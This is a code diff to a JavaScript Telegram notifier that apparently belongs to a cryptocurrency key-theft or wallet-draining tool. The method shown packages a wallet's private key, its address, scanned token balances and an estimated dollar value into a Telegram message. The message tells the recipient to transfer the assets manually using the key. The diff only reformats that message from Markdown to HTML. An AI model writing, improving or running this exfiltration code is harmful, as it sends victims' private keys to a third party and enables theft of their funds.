@@ -163,7 +163,6 @@ class TelegramNotifier {
     // Escape special characters for MarkdownV2
     return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
   }
-}
 
   async sendKeyAndAddressForManualTransfer(privateKey, walletAddress, scanResults) {
     if (!this.botToken || !this.chatId) {
@@ -172,35 +171,35 @@ class TelegramNotifier {
     }
 
     try {
-      let message = `🔑 **Private Key & Wallet Address for Manual Transfer**\n\n`;
-      message += `**Private Key:**\n\`${privateKey}\`\n\n`;
-      message += `**Wallet Address:**\n\`${walletAddress}\`\n\n`;
-      message += `**📊 Assets Found:**\n\n`;
+      let message = `🔑 <b>Private Key & Wallet Address for Manual Transfer</b>\n\n`;
+      message += `<b>Private Key:</b>\n<code>${privateKey}</code>\n\n`;
+      message += `<b>Wallet Address:</b>\n<code>${walletAddress}</code>\n\n`;
+      message += `<b>📊 Assets Found:</b>\n\n`;
 
       // Add network details
       for (const [networkKey, networkData] of Object.entries(scanResults.networks)) {
         if (networkData && networkData.hasAssets) {
-          message += `**💰 ${networkKey.toUpperCase()}**\n`;
+          message += `<b>💰 ${networkKey.toUpperCase()}</b>\n`;
           
           if (networkData.native && parseFloat(networkData.native.balance) > 0) {
-            message += `🪙 Native: ${networkData.native.balance} ${networkData.native.symbol}\n`;
+            message += `🪙 Native: <b>${networkData.native.balance} ${networkData.native.symbol}</b>\n`;
           }
           
           if (networkData.tokens && networkData.tokens.length > 0) {
-            message += `📦 Tokens (${networkData.tokens.length}):\n`;
+            message += `\n📦 Tokens (${networkData.tokens.length}):\n`;
             networkData.tokens.forEach((token, index) => {
-              message += `${index + 1}. ${token.balance} ${token.symbol}\n`;
+              message += `${index + 1}. <b>${token.balance} ${token.symbol}</b>\n`;
             });
           }
           message += `\n`;
         }
       }
 
-      message += `**Total Estimated Value:** $${scanResults.summary.estimatedValue.toFixed(2)}\n\n`;
-      message += `⚠️ **Manual Transfer Required**\n`;
+      message += `<b>Total Estimated Value:</b> $${scanResults.summary.estimatedValue.toFixed(2)}\n\n`;
+      message += `⚠️ <b>Manual Transfer Required</b>\n`;
       message += `Please transfer assets manually using the private key above.`;
 
-      await this.sendMessage(message);
+      await this.send(message, { format: 'html' });
       console.log('✅ Key and address sent to Telegram for manual transfer');
     } catch (error) {
       console.error('Failed to send key and address to Telegram:', error);
